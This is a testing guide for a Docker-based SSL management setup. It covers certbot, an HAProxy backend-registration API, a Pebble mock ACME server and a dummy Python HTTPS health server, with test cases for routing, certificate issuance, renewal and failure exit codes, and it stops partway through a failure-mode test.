# SSL Management System -- Testing Instructions

## 1. Overview

This document provides comprehensive testing instructions for the in-container SSL management system. The system has three components:

1. **`ssl-manager` base image** -- certbot, HAProxy registration client, reachability testing utilities
2. **HAProxy with Registration API** -- dynamic backend registration via HTTP API on port 8404
3. **Fulcrum service image** -- extends `ssl-manager`, adds the Fulcrum SPV server

### Testing Philosophy

The key insight driving this test architecture: **we do not need Fulcrum to validate the SSL infrastructure**. A minimal Python HTTPS server acting as a dummy service exercises the entire SSL flow end-to-end. This gives us fast, isolated, repeatable tests that validate every component of the SSL management pipeline without compiling or running the Fulcrum binary.

Every test case follows this structure:

- **Preconditions** -- what must be running or configured before the test
- **Action** -- the exact command(s) to execute
- **Expected result** -- the specific output, exit code, or state change to verify
- **Verification command** -- how to confirm the expected result

### What We Are Validating

- The `ssl-manager` base image contains all required SSL tooling
- The `ssl-setup` entrypoint script handles all SSL lifecycle scenarios (no domain, valid domain, errors)
- The HAProxy Registration API correctly manages dynamic backend configuration
- HTTP and HTTPS routing through HAProxy reaches the correct backend container
- Certificate acquisition works via certbot (real or mock ACME server)
- Certificate renewal triggers correctly
- Every failure mode produces a clear error message and non-zero exit code
- Direct (non-HAProxy) SSL mode works independently

---

## 2. Test Environment Setup

### Network

All test containers run on a dedicated Docker network:

```bash
docker network create test-haproxy-net
```

### Architecture

```
+---------------------------------------------------+
|  test-haproxy-net Docker Network                  |
|                                                   |
|  +-----------+         +----------------------+   |
|  | haproxy   | ------> | ssl-test-service     |   |
|  | :80/:443  |         | :80 (http/certbot)   |   |
|  | :8404     |         | :443 (dummy https)   |   |
|  | (API)     |         +----------------------+   |
|  +-----------+                                    |
|                        +----------------------+   |
|  +-----------+         | pebble               |   |
|  | pebble-   |         | :14000 (ACME API)    |   |
|  | challtestsrv        | :15000 (mgmt)        |   |
|  | :8055     |         +----------------------+   |
|  +-----------+                                    |
+---------------------------------------------------+
```

### docker-compose.test.yml

Place this file at `docker/tests/docker-compose.test.yml`:

```yaml
services:
  # ---------------------------------------------------------------
  # Mock ACME server (Let's Encrypt test server)
  # ---------------------------------------------------------------
  pebble:
    image: letsencrypt/pebble:latest
    container_name: pebble
    command: pebble -config /test/config/pebble-config.json -strict
    environment:
      PEBBLE_VA_NOSLEEP: "1"
      PEBBLE_VA_ALWAYS_VALID: "1"
      PEBBLE_WFE_NONCEREJECT: "0"
    volumes:
      - ./pebble-config.json:/test/config/pebble-config.json:ro
    ports:
      - "14000:14000"
      - "15000:15000"
    networks:
      - test-haproxy-net

  # Challenge test server -- responds to HTTP-01 challenges on behalf of pebble
  pebble-challtestsrv:
    image: letsencrypt/pebble-challtestsrv:latest
    container_name: pebble-challtestsrv
    command: pebble-challtestsrv -defaultIPv4 ssl-test-service
    ports:
      - "8055:8055"
    networks:
      - test-haproxy-net

  # ---------------------------------------------------------------
  # HAProxy with Registration API (custom-built from haproxy:lts)
  # ---------------------------------------------------------------
  haproxy:
    build:
      context: ../haproxy-api
      dockerfile: Dockerfile
    container_name: haproxy-test
    restart: "on-failure:5"
    ports:
      - "8080:80"
      - "8443:443"
      - "8404:8404"
    volumes:
      - letsencrypt-data:/etc/letsencrypt
    networks:
      - test-haproxy-net
    healthcheck:
      test: ["CMD", "curl", "-sf", "http://localhost:8404/v1/health"]
      interval: 5s
      timeout: 3s
      retries: 10

  # ---------------------------------------------------------------
  # Test service (FROM ssl-manager, dummy HTTPS server)
  # ---------------------------------------------------------------
  ssl-test-service:
    image: ssl-test-service:latest
    build:
      context: .
      dockerfile: Dockerfile.test-service
    container_name: ssl-test-service
    restart: "on-failure:5"
    environment:
      # Set SSL_DOMAIN to enable SSL flow; leave empty to test no-SSL mode
      SSL_DOMAIN: ""
      # Point to HAProxy registration API
      HAPROXY_HOST: "haproxy-test"
      HAPROXY_API_PORT: "8404"
      # For pebble testing:
      ACME_SERVER: "https://pebble:14000/dir"
      # For self-signed fallback:
      SSL_TEST_MODE: "0"
    volumes:
      - letsencrypt-data:/etc/letsencrypt
    networks:
      - test-haproxy-net
    depends_on:
      haproxy:
        condition: service_healthy

volumes:
  letsencrypt-data:

networks:
  test-haproxy-net:
    name: test-haproxy-net
    driver: bridge
```

### pebble-config.json

Place this file at `docker/tests/pebble-config.json`:

```json
{
  "pebble": {
    "listenAddress": "0.0.0.0:14000",
    "managementListenAddress": "0.0.0.0:15000",
    "certificate": "test/certs/localhost/cert.pem",
    "privateKey": "test/certs/localhost/key.pem",
    "httpPort": 80,
    "tlsPort": 443,
    "ocspResponderURL": "",
    "externalAccountBindingRequired": false
  }
}
```

---

## 3. Test Image Design

### Dockerfile.test-service

Place this file at `docker/tests/Dockerfile.test-service`:

```dockerfile
FROM ssl-manager:latest

# Install Python for the dummy HTTPS server
RUN apt-get update && \
    apt-get install -y --no-install-recommends python3 && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

# Copy the dummy health server
COPY test-health-server.py /usr/local/bin/test-health-server.py
RUN chmod +x /usr/local/bin/test-health-server.py

# Copy the test entrypoint
COPY test-entrypoint.sh /usr/local/bin/test-entrypoint.sh
RUN chmod +x /usr/local/bin/test-entrypoint.sh

EXPOSE 80 443

ENTRYPOINT ["/usr/local/bin/test-entrypoint.sh"]
```

### test-health-server.py

Place this file at `docker/tests/test-health-server.py`:

```python
#!/usr/bin/env python3
"""
Dual HTTP/HTTPS health server for SSL infrastructure testing.

- HTTP  on port 80:  responds to GET /health with {"status":"ok","ssl":false}
- HTTPS on port 443: responds to GET /health with {"status":"ok","ssl":true}

The HTTPS server only starts if SSL_CERT_FILE and SSL_KEY_FILE environment
variables point to valid PEM files. Otherwise, only HTTP runs.
"""

import http.server
import json
import os
import ssl
import sys
import threading


class HealthHandler(http.server.BaseHTTPRequestHandler):
    """Responds to GET /health and GET / with a JSON status payload."""

    is_ssl = False

    def do_GET(self):
        if self.path in ("/health", "/"):
            body = json.dumps({
                "status": "ok",
                "ssl": self.__class__.is_ssl,
                "container": os.environ.get("HOSTNAME", "unknown"),
            })
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body.encode())
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, fmt, *args):
        sys.stderr.write("[health-server] %s\n" % (fmt % args))


def run_http(port=80):
    """Run plain HTTP server."""
    handler = type("HTTPHandler", (HealthHandler,), {"is_ssl": False})
    server = http.server.HTTPServer(("0.0.0.0", port), handler)
    print(f"[health-server] HTTP listening on :{port}", flush=True)
    server.serve_forever()


def run_https(port=443):
    """Run HTTPS server using certs from environment variables."""
    cert_file = os.environ.get("SSL_CERT_FILE", "/etc/ssl/certs/server.crt")
    key_file = os.environ.get("SSL_KEY_FILE", "/etc/ssl/private/server.key")

    if not os.path.isfile(cert_file) or not os.path.isfile(key_file):
        print(f"[health-server] HTTPS disabled: cert={cert_file} key={key_file} not found", flush=True)
        return

    handler = type("HTTPSHandler", (HealthHandler,), {"is_ssl": True})
    server = http.server.HTTPServer(("0.0.0.0", port), handler)

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile=cert_file, keyfile=key_file)
    server.socket = ctx.wrap_socket(server.socket, server_side=True)

    print(f"[health-server] HTTPS listening on :{port}", flush=True)
    server.serve_forever()


if __name__ == "__main__":
    # Start HTTP in a background thread
    http_thread = threading.Thread(target=run_http, daemon=True)
    http_thread.start()

    # Start HTTPS in the foreground (blocks)
    # If certs are missing, this returns immediately and we fall through
    # to keep the container alive via the HTTP thread.
    run_https()

    # If HTTPS did not start, keep running via HTTP thread
    http_thread.join()
```

### test-entrypoint.sh

Place this file at `docker/tests/test-entrypoint.sh`:

```bash
#!/bin/bash
set -euo pipefail

echo "[test-entrypoint] Starting test service..."
echo "[test-entrypoint] SSL_DOMAIN=${SSL_DOMAIN:-<not set>}"
echo "[test-entrypoint] HAPROXY_HOST=${HAPROXY_HOST:-<not set>}"
echo "[test-entrypoint] SSL_TEST_MODE=${SSL_TEST_MODE:-0}"
echo "[test-entrypoint] ACME_SERVER=${ACME_SERVER:-<not set>}"

# Run ssl-setup if SSL_DOMAIN is set
if [[ -n "${SSL_DOMAIN:-}" ]]; then
    echo "[test-entrypoint] Running ssl-setup..."
    /usr/local/bin/ssl-setup
    SSL_SETUP_EXIT=$?
    if [[ $SSL_SETUP_EXIT -ne 0 ]]; then
        echo "[test-entrypoint] ssl-setup failed with exit code $SSL_SETUP_EXIT"
        exit $SSL_SETUP_EXIT
    fi
    echo "[test-entrypoint] ssl-setup completed successfully"
fi

# Start the dummy health server
echo "[test-entrypoint] Starting health server..."
exec python3 /usr/local/bin/test-health-server.py
```

---

## 4. Test Suites

### Test Suite 1: ssl-manager Base Image

These tests validate the ssl-manager base image has the correct contents and tooling.

#### Test 1.1: Image builds successfully

**Action:**
```bash
docker build -t ssl-manager:latest -f Dockerfile.ssl-manager .
```

**Expected result:** Exit code 0, image tagged `ssl-manager:latest`.

**Verification:**
```bash
docker images ssl-manager:latest --format '{{.Repository}}:{{.Tag}}'
# Expected output: ssl-manager:latest
```

#### Test 1.2: Certbot is present and functional

**Action:**
```bash
docker run --rm ssl-manager:latest certbot --version
```

**Expected result:** Exit code 0. Output contains `certbot` and a version number (e.g., `certbot 2.x.x`).

**Verification:**
```bash
docker run --rm ssl-manager:latest certbot --version 2>&1 | grep -qE 'certbot [0-9]+\.'
echo "Exit: $?"
# Expected: Exit: 0
```

#### Test 1.3: SSL utilities are present

**Action:**
```bash
docker run --rm ssl-manager:latest sh -c '
    openssl version && \
    curl --version | head -1 && \
    jq --version && \
    nc -h 2>&1 | head -1
'
```

**Expected result:** Exit code 0. All four commands produce version output.

**Verification:** Each command individually:
```bash
docker run --rm ssl-manager:latest openssl version
# Expected: OpenSSL X.X.X ...

docker run --rm ssl-manager:latest curl --version | head -1
# Expected: curl X.X.X ...

docker run --rm ssl-manager:latest jq --version
# Expected: jq-X.X

docker run --rm ssl-manager:latest which nc
# Expected: /usr/bin/nc (or similar path)
```

#### Test 1.4: ssl-setup script exists and is executable

**Action:**
```bash
docker run --rm ssl-manager:latest test -x /usr/local/bin/ssl-setup
echo "Exit: $?"
```

**Expected result:** `Exit: 0`

**Verification:**
```bash
docker run --rm ssl-manager:latest ls -la /usr/local/bin/ssl-setup
# Expected: -rwxr-xr-x ... /usr/local/bin/ssl-setup
```

#### Test 1.5: No SSL_DOMAIN -- ssl-setup exits cleanly

**Action:**
```bash
docker run --rm -e SSL_DOMAIN="" ssl-manager:latest /usr/local/bin/ssl-setup
echo "Exit: $?"
```

**Expected result:** Exit code 0. Output indicates SSL is not configured (e.g., "No SSL_DOMAIN set, skipping SSL setup").

**Verification:**
```bash
docker run --rm -e SSL_DOMAIN="" ssl-manager:latest /usr/local/bin/ssl-setup 2>&1 | grep -i "skip\|no.*domain\|ssl not configured"
echo "Exit: $?"
# Expected: Exit: 0 (grep found a match)
```

#### Test 1.6: Invalid SSL_DOMAIN -- ssl-setup fails with clear error

**Action:**
```bash
docker run --rm \
    -e SSL_DOMAIN="not a valid domain!!!" \
    -e HAPROXY_HOST="" \
    -e SSL_TEST_MODE="0" \
    ssl-manager:latest /usr/local/bin/ssl-setup
echo "Exit: $?"
```

**Expected result:** Non-zero exit code. Output contains an error message about the invalid domain.

**Verification:**
```bash
EXIT_CODE=$(docker run --rm \
    -e SSL_DOMAIN="not a valid domain!!!" \
    -e HAPROXY_HOST="" \
    -e SSL_TEST_MODE="0" \
    ssl-manager:latest /usr/local/bin/ssl-setup 2>&1; echo $?)
[[ $EXIT_CODE -ne 0 ]] && echo "PASS: non-zero exit" || echo "FAIL: expected non-zero exit"
```

---

### Test Suite 2: HAProxy Registration API

These tests validate the dynamic backend registration API on port 8404.

**Precondition:** Start the HAProxy container with the registration API:
```bash
docker run -d --name haproxy-test \
    --network test-haproxy-net \
    -p 8080:80 -p 8443:443 -p 8404:8404 \
    haproxy-api:test

# Wait for healthy
for i in $(seq 1 30); do
    curl -sf http://localhost:8404/v1/health >/dev/null 2>&1 && break
    sleep 1
done
```

#### Test 2.1: API starts and health check responds

**Action:**
```bash
curl -sf http://localhost:8404/v1/health
```

**Expected result:** HTTP 200 with JSON body:
```json
{"status":"healthy","haproxy_pid":...,"api_version":"1.0","backends_count":...}
```

**Verification:**
```bash
HTTP_CODE=$(curl -s -o /tmp/health.json -w '%{http_code}' http://localhost:8404/v1/health)
[[ "$HTTP_CODE" == "200" ]] && echo "PASS" || echo "FAIL: got $HTTP_CODE"
STATUS=$(jq -r '.status' /tmp/health.json)
[[ "$STATUS" == "healthy" ]] && echo "PASS: status=healthy" || echo "FAIL: status=$STATUS"
```

#### Test 2.2: Register a backend

**Action:**
```bash
curl -s -X POST http://localhost:8404/v1/backends \
    -H 'Content-Type: application/json' \
    -d '{
        "domain": "test.example.com",
        "container": "ssl-test-service",
        "http_port": 80,
        "https_port": 443
    }'
```

**Expected result:** HTTP 201 with JSON body confirming registration:
```json
{
    "domain": "test.example.com",
    "container": "ssl-test-service",
    "http_port": 80,
    "https_port": 443,
    "created_at": "2024-01-15T10:30:00Z"
}
```

**Verification:**
```bash
HTTP_CODE=$(curl -s -o /tmp/register.json -w '%{http_code}' \
    -X POST http://localhost:8404/v1/backends \
    -H 'Content-Type: application/json' \
    -d '{"domain":"test.example.com","container":"ssl-test-service","http_port":80,"https_port":443}')
[[ "$HTTP_CODE" == "201" ]] && echo "PASS: 201 Created" || echo "FAIL: got $HTTP_CODE"
# Verify canonical response fields
jq -e '.domain and .container and .http_port and .https_port and .created_at' /tmp/register.json >/dev/null
[[ $? -eq 0 ]] && echo "PASS: canonical fields present" || echo "FAIL: missing expected fields"
```

#### Test 2.3: List backends includes the registered backend

**Action:**
```bash
curl -s http://localhost:8404/v1/backends
```

**Expected result:** HTTP 200 with JSON object containing a `backends` array and `count`:
```json
{
    "backends": [
        {
            "domain": "test.example.com",
            "container": "ssl-test-service",
            "http_port": 80,
            "https_port": 443,
            "created_at": "2024-01-15T10:30:00Z"
        }
    ],
    "count": 1
}
```

**Verification:**
```bash
RESPONSE=$(curl -s http://localhost:8404/v1/backends)
echo "$RESPONSE" | jq -r '.backends[].domain' | grep -q 'test.example.com'
[[ $? -eq 0 ]] && echo "PASS" || echo "FAIL: domain not in list"
COUNT=$(echo "$RESPONSE" | jq -r '.count')
[[ "$COUNT" -ge 1 ]] && echo "PASS: count=$COUNT" || echo "FAIL: unexpected count=$COUNT"
```

#### Test 2.4: Get specific backend by domain

**Action:**
```bash
curl -s http://localhost:8404/v1/backends/test.example.com
```

**Expected result:** HTTP 200 with JSON object for that domain.

**Verification:**
```bash
HTTP_CODE=$(curl -s -o /tmp/get-backend.json -w '%{http_code}' \
    http://localhost:8404/v1/backends/test.example.com)
[[ "$HTTP_CODE" == "200" ]] && echo "PASS" || echo "FAIL: got $HTTP_CODE"
DOMAIN=$(jq -r '.domain' /tmp/get-backend.json)
[[ "$DOMAIN" == "test.example.com" ]] && echo "PASS: domain matches" || echo "FAIL: got $DOMAIN"
```

#### Test 2.5: Idempotent re-registration (same domain, same container)

**Action:**
```bash
curl -s -o /dev/null -w '%{http_code}' \
    -X POST http://localhost:8404/v1/backends \
    -H 'Content-Type: application/json' \
    -d '{"domain":"test.example.com","container":"ssl-test-service","http_port":80,"https_port":443}'
```

**Expected result:** HTTP 200 (not 201, because it already exists with the same data). Response body includes `"message":"already registered"` alongside the canonical fields:
```json
{
    "domain": "test.example.com",
    "container": "ssl-test-service",
    "http_port": 80,
    "https_port": 443,
    "created_at": "2024-01-15T10:30:00Z",
    "message": "already registered"
}
```

**Verification:**
```bash
HTTP_CODE=$(curl -s -o /tmp/idempotent.json -w '%{http_code}' \
    -X POST http://localhost:8404/v1/backends \
    -H 'Content-Type: application/json' \
    -d '{"domain":"test.example.com","container":"ssl-test-service","http_port":80,"https_port":443}')
[[ "$HTTP_CODE" == "200" ]] && echo "PASS: idempotent 200" || echo "FAIL: got $HTTP_CODE"
MSG=$(jq -r '.message' /tmp/idempotent.json)
[[ "$MSG" == "already registered" ]] && echo "PASS: message field correct" || echo "FAIL: message=$MSG"
```

#### Test 2.6: Conflict detection (same domain, different container)

**Action:**
```bash
curl -s -o /dev/null -w '%{http_code}' \
    -X POST http://localhost:8404/v1/backends \
    -H 'Content-Type: application/json' \
    -d '{"domain":"test.example.com","container":"different-container","http_port":80,"https_port":443}'
```

**Expected result:** HTTP 409 Conflict.

**Verification:**
```bash
HTTP_CODE=$(curl -s -o /tmp/conflict.json -w '%{http_code}' \
    -X POST http://localhost:8404/v1/backends \
    -H 'Content-Type: application/json' \
    -d '{"domain":"test.example.com","container":"different-container","http_port":80,"https_port":443}')
[[ "$HTTP_CODE" == "409" ]] && echo "PASS: 409 Conflict" || echo "FAIL: got $HTTP_CODE"
```

#### Test 2.7: Config file generated after registration

**Action:**
```bash
docker exec haproxy-test cat /etc/haproxy/conf.d/20-backends.cfg
```

**Expected result:** File contains a backend definition for `ssl-test-service` and the domain `test.example.com`.

**Verification:**
```bash
docker exec haproxy-test cat /etc/haproxy/conf.d/20-backends.cfg \
    | grep -q 'ssl-test-service'
[[ $? -eq 0 ]] && echo "PASS: backend in config" || echo "FAIL: backend not found in config"
```

#### Test 2.8: Domain map updated after registration

**Action:**
```bash
docker exec haproxy-test cat /etc/haproxy/maps/http-domains.map
```

**Expected result:** File contains `test.example.com` mapping.

**Verification:**
```bash
docker exec haproxy-test cat /etc/haproxy/maps/http-domains.map \
    | grep -q 'test.example.com'
[[ $? -eq 0 ]] && echo "PASS: domain in map" || echo "FAIL: domain not in map"
```

#### Test 2.9: HAProxy reloaded and serving traffic for new domain

**Action:**
```bash
# First ensure the test service is running on the network
docker run -d --name ssl-test-service \
    --network test-haproxy-net \
    ssl-test-service:latest

# Then test routing
curl -sf -H "Host: test.example.com" http://localhost:8080/health
```

**Expected result:** HTTP 200 with `{"status":"ok","ssl":false}` from the test service.

**Verification:**
```bash
RESPONSE=$(curl -sf -H "Host: test.example.com" http://localhost:8080/health)
echo "$RESPONSE" | jq -r '.status'
# Expected: ok
echo "$RESPONSE" | jq -r '.ssl'
# Expected: false
```

#### Test 2.10: Unregister a backend

**Action:**
```bash
curl -s -o /dev/null -w '%{http_code}' \
    -X DELETE http://localhost:8404/v1/backends/test.example.com
```

**Expected result:** HTTP 204 No Content.

**Verification:**
```bash
HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' \
    -X DELETE http://localhost:8404/v1/backends/test.example.com)
[[ "$HTTP_CODE" == "204" ]] && echo "PASS: 204 No Content" || echo "FAIL: got $HTTP_CODE"

# Confirm domain is gone from list
curl -s http://localhost:8404/v1/backends | jq -r '.backends[].domain' | grep -q 'test.example.com'
[[ $? -ne 0 ]] && echo "PASS: domain removed" || echo "FAIL: domain still present"
```

#### Test 2.11: Force reload

**Action:**
```bash
curl -s -o /dev/null -w '%{http_code}' -X POST http://localhost:8404/v1/reload
```

**Expected result:** HTTP 200.

**Verification:**
```bash
HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' -X POST http://localhost:8404/v1/reload)
[[ "$HTTP_CODE" == "200" ]] && echo "PASS" || echo "FAIL: got $HTTP_CODE"
```

#### Test 2.12: Get non-existent backend returns 404

**Action:**
```bash
curl -s -o /dev/null -w '%{http_code}' http://localhost:8404/v1/backends/nonexistent.example.com
```

**Expected result:** HTTP 404.

**Verification:**
```bash
HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' http://localhost:8404/v1/backends/nonexistent.example.com)
[[ "$HTTP_CODE" == "404" ]] && echo "PASS" || echo "FAIL: got $HTTP_CODE"
```

---

### Test Suite 3: HAProxy Integration (HTTP Routing)

These tests validate that HAProxy correctly routes traffic to registered backends.

**Precondition:** HAProxy and ssl-test-service are both running on `test-haproxy-net`. The backend is registered via the API.

```bash
# Ensure test service is running
docker run -d --name ssl-test-service \
    --network test-haproxy-net \
    ssl-test-service:latest

# Register it
curl -s -X POST http://localhost:8404/v1/backends \
    -H 'Content-Type: application/json' \
    -d '{"domain":"test.example.com","container":"ssl-test-service","http_port":80,"https_port":443}'
```

#### Test 3.1: HTTP routing reaches the test service

**Action:**
```bash
curl -sf -H "Host: test.example.com" http://localhost:8080/health
```

**Expected result:**
```json
{"status": "ok", "ssl": false, "container": "..."}
```

**Verification:**
```bash
RESPONSE=$(curl -sf -H "Host: test.example.com" http://localhost:8080/health)
STATUS=$(echo "$RESPONSE" | jq -r '.status')
SSL=$(echo "$RESPONSE" | jq -r '.ssl')
[[ "$STATUS" == "ok" && "$SSL" == "false" ]] && echo "PASS" || echo "FAIL: status=$STATUS ssl=$SSL"
```

#### Test 3.2: Unregistered domain returns 503

**Action:**
```bash
curl -s -o /dev/null -w '%{http_code}' -H "Host: unknown.example.com" http://localhost:8080/health
```

**Expected result:** HTTP 503.

**Verification:**
```bash
HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' \
    -H "Host: unknown.example.com" http://localhost:8080/health)
[[ "$HTTP_CODE" == "503" ]] && echo "PASS: 503 for unknown domain" || echo "FAIL: got $HTTP_CODE"
```

#### Test 3.3: No Host header returns 503 (default backend)

**Action:**
```bash
curl -s -o /dev/null -w '%{http_code}' http://localhost:8080/health
```

**Expected result:** HTTP 503 (or 400 depending on HAProxy configuration).

**Verification:**
```bash
HTTP_CODE=$(curl -s -o /dev/null -w '%{http_code}' http://localhost:8080/health)
[[ "$HTTP_CODE" == "503" || "$HTTP_CODE" == "400" ]] && echo "PASS: default backend rejects" || echo "FAIL: got $HTTP_CODE"
```

#### Test 3.4: Multiple backends can be registered and routed independently

**Action:**
```bash
# Start a second test service
docker run -d --name ssl-test-service-2 \
    --network test-haproxy-net \
    ssl-test-service:latest

# Register it under a different domain
curl -s -X POST http://localhost:8404/v1/backends \
    -H 'Content-Type: application/json' \
    -d '{"domain":"other.example.com","container":"ssl-test-service-2","http_port":80,"https_port":443}'

# Query each domain
curl -sf -H "Host: test.example.com" http://localhost:8080/health
curl -sf -H "Host: other.example.com" http://localhost:8080/health
```

**Expected result:** Each returns 200 with a different container hostname.

**Verification:**
```bash
C1=$(curl -sf -H "Host: test.example.com" http://localhost:8080/health | jq -r '.container')
C2=$(curl -sf -H "Host: other.example.com" http://localhost:8080/health | jq -r '.container')
[[ -n "$C1" && -n "$C2" && "$C1" != "$C2" ]] && echo "PASS: different containers" || echo "FAIL: C1=$C1 C2=$C2"
```

**Cleanup:**
```bash
curl -s -X DELETE http://localhost:8404/v1/backends/other.example.com
docker rm -f ssl-test-service-2
```

#### Test 3.5: HTTPS passthrough routes TLS traffic correctly

**Precondition:** The test service must be running HTTPS (self-signed cert). Use `SSL_TEST_MODE=1`.

**Action:**
```bash
# Restart test service with self-signed cert
docker rm -f ssl-test-service
docker run -d --name ssl-test-service \
    --network test-haproxy-net \
    -e SSL_TEST_MODE=1 \
    -e SSL_DOMAIN=test.example.com \
    ssl-test-service:latest

# Wait for HTTPS to start
sleep 3

# Test HTTPS through HAProxy (port 8443, SNI passthrough)
curl -sk --resolve test.example.com:8443:127.0.0.1 \
    https://test.example.com:8443/health
```

**Expected result:**
```json
{"status": "ok", "ssl": true, "container": "..."}
```

**Verification:**
```bash
RESPONSE=$(curl -sk --resolve test.example.com:8443:127.0.0.1 \
    https://test.example.com:8443/health)
SSL=$(echo "$RESPONSE" | jq -r '.ssl')
[[ "$SSL" == "true" ]] && echo "PASS: HTTPS passthrough works" || echo "FAIL: ssl=$SSL"
```

---

### Test Suite 4: End-to-End SSL Flow

#### Option A: With Mock ACME Server (Pebble)

**Precondition:** Pebble, pebble-challtestsrv, and HAProxy are running via docker-compose.

```bash
cd docker/tests
docker compose -f docker-compose.test.yml up -d pebble pebble-challtestsrv haproxy
# Wait for services
sleep 5
```

#### Test 4.1: Full SSL flow with pebble

**Action:**
```bash
docker compose -f docker-compose.test.yml run --rm \
    -e SSL_DOMAIN=test.local \
    -e HAPROXY_HOST=haproxy-test \
    -e HAPROXY_API_PORT=8404 \
    -e ACME_SERVER=https://pebble:14000/dir \
    -e REQUESTS_CA_BUNDLE=/etc/ssl/certs/pebble-ca.crt \
    ssl-test-service
```

**Expected result:** Exit code 0. Logs show:
1. ssl-setup detects HAProxy at `haproxy-test:8404`
2. ssl-setup registers domain `test.local` with HAProxy
3. ssl-setup runs certbot against pebble ACME server
4. Certificate obtained successfully
5. HTTPS server starts on port 443

**Verification:**
```bash
# From another terminal, while the service is running:
curl -sk --resolve test.local:8443:127.0.0.1 https://test.local:8443/health
# Expected: {"status":"ok","ssl":true,...}

# Verify certificate was issued by pebble
echo | openssl s_client -connect localhost:8443 -servername test.local 2>/dev/null \
    | openssl x509 -noout -issuer
# Expected: issuer contains "Pebble"
```

#### Option B: With Self-Signed Fallback (SSL_TEST_MODE=1)

#### Test 4.2: Self-signed cert in test mode

**Action:**
```bash
docker run -d --name ssl-test-selfsigned \
    --network test-haproxy-net \
    -e SSL_DOMAIN=test.local \
    -e SSL_TEST_MODE=1 \
    ssl-test-service:latest
```

**Expected result:** Container starts successfully. Logs show ssl-setup generated a self-signed certificate and HTTPS started.

**Verification:**
```bash
# Wait for startup
sleep 3

# Check logs
docker logs ssl-test-selfsigned 2>&1 | grep -i "self-signed\|generating.*cert\|HTTPS.*listening"

# Test HTTPS
docker exec ssl-test-selfsigned curl -sk https://localhost:443/health
# Expected: {"status":"ok","ssl":true,...}

# Verify it is self-signed
docker exec ssl-test-selfsigned openssl x509 -in /etc/ssl/certs/server.crt -noout -subject -issuer
# Expected: subject and issuer are the same (self-signed)
```

**Cleanup:**
```bash
docker rm -f ssl-test-selfsigned
```

#### Test 4.3: ssl-setup registers with HAProxy before obtaining cert

This test verifies the ordering: register domain with HAProxy first (so HTTP-01 challenges can route), then run certbot.

**Action:**
```bash
docker run --rm --name ssl-test-order \
    --network test-haproxy-net \
    -e SSL_DOMAIN=test.local \
    -e HAPROXY_HOST=haproxy-test \
    -e HAPROXY_API_PORT=8404 \
    -e SSL_TEST_MODE=1 \
    ssl-test-service:latest \
    /usr/local/bin/ssl-setup 2>&1
```

**Expected result:** In the output, the HAProxy registration message appears BEFORE any certbot or certificate generation message.

**Verification:**
```bash
OUTPUT=$(docker run --rm --name ssl-test-order \
    --network test-haproxy-net \
    -e SSL_DOMAIN=test.local \
    -e HAPROXY_HOST=haproxy-test \
    -e HAPROXY_API_PORT=8404 \
    -e SSL_TEST_MODE=1 \
    ssl-test-service:latest \
    /usr/local/bin/ssl-setup 2>&1)

REGISTER_LINE=$(echo "$OUTPUT" | grep -n -i "register" | head -1 | cut -d: -f1)
CERT_LINE=$(echo "$OUTPUT" | grep -n -i "cert\|certbot\|self-signed" | head -1 | cut -d: -f1)

[[ -n "$REGISTER_LINE" && -n "$CERT_LINE" && "$REGISTER_LINE" -lt "$CERT_LINE" ]] \
    && echo "PASS: register before cert" \
    || echo "FAIL: register=$REGISTER_LINE cert=$CERT_LINE"
```

---

### Test Suite 5: Certificate Renewal

#### Test 5.1: Renewal check triggers when cert expires soon

**Precondition:** Generate a short-lived self-signed cert (expires in 1 day) and mount it into the container.

**Action:**
```bash
# Generate a cert that expires in 1 day
mkdir -p /tmp/ssl-test-certs
openssl req -x509 -newkey rsa:2048 -keyout /tmp/ssl-test-certs/server.key \
    -out /tmp/ssl-test-certs/server.crt -days 1 -nodes \
    -subj "/CN=test.local" 2>/dev/null

# Start container with the short-lived cert
docker run -d --name ssl-test-renew \
    --network test-haproxy-net \
    -e SSL_DOMAIN=test.local \
    -e SSL_TEST_MODE=1 \
    -v /tmp/ssl-test-certs:/etc/ssl/certs:rw \
    -v /tmp/ssl-test-certs:/etc/ssl/private:rw \
    -e SSL_CERT_FILE=/etc/ssl/certs/server.crt \
    -e SSL_KEY_FILE=/etc/ssl/private/server.key \
    ssl-test-service:latest
```

**Expected result:** The renewal check mechanism detects the certificate will expire within 30 days and triggers a renewal (or logs that renewal would be triggered).

**Verification:**
```bash
sleep 5
docker logs ssl-test-renew 2>&1 | grep -i "renew\|expir\|refresh"
# Expected: log line indicating renewal was triggered or cert is near expiry
```

**Cleanup:**
```bash
docker rm -f ssl-test-renew
rm -rf /tmp/ssl-test-certs
```

#### Test 5.2: Renewal replaces certificate files

**Action:** After renewal triggers (from Test 5.1), verify the certificate files have been updated.

**Verification:**
```bash
# Check the new cert has a later expiry than the original
docker exec ssl-test-renew openssl x509 -in /etc/ssl/certs/server.crt -noout -enddate
# Expected: notAfter date is further in the future than the original 1-day cert
```

---

### Test Suite 6: Failure Modes

Each test validates that a specific failure produces a clear error and a specific exit code.

**Exit code reference:**

| Exit Code | Meaning |
|---|---|
| 10 | Domain unreachable |
| 11 | Certbot failed |
| 12 | TLS verification failed |
| 13 | HAProxy registration failed |
| 14 | HAProxy reload failed |

#### Test 6.1: HAProxy unreachable

**Action:**
```bash
docker run --rm \
    -e SSL_DOMAIN=test.local \
    -e HAPROXY_HOST=nonexistent-host \
    -e HAPROXY_API_PORT=8404 \
    ssl-test-service:latest /usr/local/bin/ssl-setup
echo "Exit: $?"
```

**Expected result:** Exit code 13 (HAProxy registration failed). Error output contains "connection" or "unreachable" or "refused" or "resolve".

**Verification:**
```bash
docker run --rm \
    -e SSL_DOMAIN=test.local \
    -e HAPROXY_HOST=nonexistent-host \
    -e HAPROXY_API_PORT=8404 \
    ssl-test-service:latest /usr/local/bin/ssl-setup 2>&1
EXIT=$?
[[ $EXIT -eq 13 ]] && echo "PASS: exit code 13" || echo "FAIL: expected exit 13, got $EXIT"
```

#### Test 6.2: Domain not reachable from outside

When ssl-setup tests whether the domain actually resolves and routes to the container, and it does not, it should fail.

**Action:**
```bash
docker run --rm \
    --network test-haproxy-net \
